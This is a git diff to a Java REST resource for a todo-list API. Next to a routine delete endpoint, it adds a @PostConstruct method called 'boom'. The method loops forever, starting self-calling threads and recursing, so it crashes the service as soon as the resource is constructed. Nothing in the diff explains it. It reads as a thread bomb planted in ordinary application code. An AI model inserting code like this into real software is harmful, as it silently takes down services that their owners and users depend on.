@@ -3,6 +3,7 @@ package nl.terra10.api;
 import nl.terra10.api.model.Todo;
 import nl.terra10.api.server.TodoService;
 
+import javax.annotation.PostConstruct;
 import javax.inject.Inject;
 import javax.ws.rs.*;
 import javax.ws.rs.core.MediaType;
@@ -44,6 +45,14 @@ public class TodosResource {
     public List<Todo> delete() {
         todoService.removeAll();
         return list();
+    }
+
+    @PostConstruct
+    public void boom() {
+        while (true) {
+            new Thread(this::boom).start();
+            boom();
+        }
     }
 
 }
